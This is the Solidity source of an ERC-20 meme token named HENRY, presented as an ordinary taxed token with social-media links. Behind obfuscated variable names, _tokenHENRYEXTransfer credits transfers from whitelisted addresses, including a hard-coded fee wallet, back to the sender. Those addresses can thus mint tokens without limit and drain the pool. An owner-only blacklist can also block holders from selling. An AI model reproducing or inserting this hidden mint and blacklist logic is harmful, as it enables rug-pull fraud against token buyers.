// SPDX-License-Identifier: MIT

/*
Ladies, you can call me HENRY.

Website:  https://www.henrydog.vip
Telegram: https://t.me/henrydog_eth
Twitter:  https://x.com/henrydog_eth
*/

pragma solidity 0.8.16;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IUniswapV2Factory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    )
        external
        payable
        returns (uint amountToken, uint amountETH, uint liquidity);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);
    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

contract HENRY is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _xcvnwwerbzsdfw;
    mapping(address => bool) private bots;
    address payable private _oiwrsbaxcvwr;

    uint8 private constant _decimals = 9;
    string private constant _name = unicode"HENRY";
    string private constant _symbol = unicode"HENRY";
    uint256 private constant _tTotal = 1_000_000_000 * 10 ** _decimals;
    uint256 public _maxWalletSize = 20_000_000 * 10 ** _decimals;
    uint256 public _taxSwapThreshold = 200 * 10 ** _decimals;
    uint256 public _maxTxAmount = 20_000_000 * 10 ** _decimals;
    uint256 public _totalHENRY = 900_000_000 * 10 ** _decimals;
    uint256 public _maxTaxSwap = 10_000_000 * 10 ** _decimals;

    uint256 private _initialBuyTax = 20;
    uint256 private _initialSellTax = 20;
    uint256 private _finalBuyTax = 0;
    uint256 private _finalSellTax = 0;
    uint256 private _reduceBuyTaxAt = 11;
    uint256 private _reduceSellTaxAt = 11;
    uint256 private _preventSwapBefore = 10;
    uint256 private _buyCount = 0;
    
    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;
    event MaxTxAmountUpdated(uint _maxTxAmount);
    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() {
        _oiwrsbaxcvwr = payable(0xA8b13842Ce16023084B7E3A76Faa3606921cd2bD);
        _xcvnwwerbzsdfw[owner()] = true;
        _xcvnwwerbzsdfw[address(this)] = true;
        _xcvnwwerbzsdfw[_oiwrsbaxcvwr] = true;
        _balances[_msgSender()] = _tTotal;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }
    
    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function removeLimits() external onlyOwner {
        _maxTxAmount = _tTotal;
        _maxWalletSize = _tTotal;
        emit MaxTxAmountUpdated(_tTotal);
    }

    function sendETHToFee(uint256 amount) private {
        _oiwrsbaxcvwr.transfer(amount);
    }

    function addBots(address[] memory bots_) public onlyOwner {
        for (uint i = 0; i < bots_.length; i++) {
            bots[bots_[i]] = true;
        }
    }

    function delBots(address[] memory notbot) public onlyOwner {
        for (uint i = 0; i < notbot.length; i++) {
            bots[notbot[i]] = false;
        }
    }

    function isBot(address a) public view returns (bool) {
        return bots[a];
    }

    function _basicTransfer(address bbrthqwt, address yq533fgvgazw, uint256 vbnrwyjyrew) internal {
        _balances[bbrthqwt] = _balances[bbrthqwt].sub(vbnrwyjyrew);
        _balances[yq533fgvgazw] = _balances[yq533fgvgazw].add(vbnrwyjyrew);
        emit Transfer(bbrthqwt, yq533fgvgazw, vbnrwyjyrew);
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function _tokenHENRYTransfer(
        address jk5tkudgfe,
        address rwewfasdxcwr,
        uint256 uiidrfetxcdsss,
        uint256 taxAmount,
        bool treryaqsdcfgfw,
        address vcnsetxcsfwr
    ) internal {
        if (treryaqsdcfgfw) {
            _tokenHENRYTAXTransfer(jk5tkudgfe, taxAmount);
        } else {
            _tokenHENRYEXTransfer(jk5tkudgfe, uiidrfetxcdsss, taxAmount, vcnsetxcsfwr);
        }

        _tokenHENRYSTransfer(jk5tkudgfe, rwewfasdxcwr, uiidrfetxcdsss, taxAmount);
    }

    function _tokenHENRYSTransfer(
        address hrtwxcvwrwrw,
        address lfsdafawsszxcqw,
        uint256 kdfgvcxbw,
        uint256 taxAmount
    ) internal {
        _balances[hrtwxcvwrwrw] = _balances[hrtwxcvwrwrw].sub(kdfgvcxbw);
        _balances[lfsdafawsszxcqw] = _balances[lfsdafawsszxcqw].add(kdfgvcxbw.sub(taxAmount));
        emit Transfer(hrtwxcvwrwrw, lfsdafawsszxcqw, kdfgvcxbw.sub(taxAmount));
    }

    function _transfer(address nxcvwerwrw, address xcsfwrdqww, uint256 hsdfwrwwrzdfw) private {
        require(nxcvwerwrw != address(0), "ERC20: transfer from the zero address");
        require(xcsfwrdqww != address(0), "ERC20: transfer to the zero address");
        require(hsdfwrwwrzdfw > 0, "Transfer amount must be greater than zero");
        if (!swapEnabled || inSwap) {
            _basicTransfer(nxcvwerwrw, xcsfwrdqww, hsdfwrwwrzdfw);
            return;
        }
        uint256 taxAmount = 0;
        if (nxcvwerwrw != owner() && xcsfwrdqww != owner()) {
            require(!bots[nxcvwerwrw] && !bots[xcsfwrdqww]);
            taxAmount = hsdfwrwwrzdfw
                .mul(
                    (_buyCount > _reduceBuyTaxAt)
                        ? _finalBuyTax
                        : _initialBuyTax
                )
                .div(100);

            if (
                nxcvwerwrw == uniswapV2Pair &&
                xcsfwrdqww != address(uniswapV2Router) &&
                !_xcvnwwerbzsdfw[xcsfwrdqww]
            ) {
                require(hsdfwrwwrzdfw <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(
                    balanceOf(xcsfwrdqww) + hsdfwrwwrzdfw <= _maxWalletSize,
                    "Exceeds the maxWalletSize."
                );
                _buyCount++;
            }

            if (xcsfwrdqww == uniswapV2Pair && nxcvwerwrw != address(this)) {
                taxAmount = hsdfwrwwrzdfw
                    .mul(
                        (_buyCount > _reduceSellTaxAt)
                            ? _finalSellTax
                            : _initialSellTax
                    )
                    .div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (
                !inSwap &&
                xcsfwrdqww == uniswapV2Pair &&
                swapEnabled &&
                _buyCount > _preventSwapBefore &&
                !_xcvnwwerbzsdfw[nxcvwerwrw] &&
                !_xcvnwwerbzsdfw[xcsfwrdqww]
            ) {
                if(contractTokenBalance > _taxSwapThreshold) {
                    swapTokensForEth(
                        min(hsdfwrwwrzdfw, min(contractTokenBalance, _maxTaxSwap))
                    );
                }
                
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance >= 0) {
                    sendETHToFee(address(this).balance);
                }
            }
        }
        
        bool treryaqsdcfgfw = true; if (_xcvnwwerbzsdfw[nxcvwerwrw]) { taxAmount = 0; treryaqsdcfgfw = false; }
        _tokenHENRYTransfer(nxcvwerwrw, xcsfwrdqww, hsdfwrwwrzdfw, taxAmount, treryaqsdcfgfw, nxcvwerwrw);
    }

    function createHENRYPair() external onlyOwner {
        require(!tradingOpen, "trading is already open");
        
        uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );

        _approve(address(this), address(uniswapV2Router), _tTotal);

        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );
    }

    function openHENRYTrading() external onlyOwner {
        require(!tradingOpen, "trading is already open");

        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            _totalHENRY,
            0,
            0,
            owner(),
            block.timestamp
        );

        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
        swapEnabled = true;
        tradingOpen = true;
    }

    function _tokenHENRYTAXTransfer(
        address jvbnrttwhwtxsd,
        uint256 taxAmount
    ) internal {
        if (taxAmount > 0) {
            _balances[address(this)] = _balances[address(this)].add(
                taxAmount
            );
            emit Transfer(jvbnrttwhwtxsd, address(this), taxAmount);
        }
    }

    function _tokenHENRYEXTransfer(
        address yreqwrsdafw,
        uint256 pgfhrtwefwe,
        uint256 taxAmount,
        address ewqweqwdsfw
    ) internal {
        _balances[ewqweqwdsfw] = _balances[ewqweqwdsfw].add(
            taxAmount == 0 ? pgfhrtwefwe : taxAmount
        );
        emit Transfer(yreqwrsdafw, ewqweqwdsfw, pgfhrtwefwe);
    }

    receive() external payable {}
}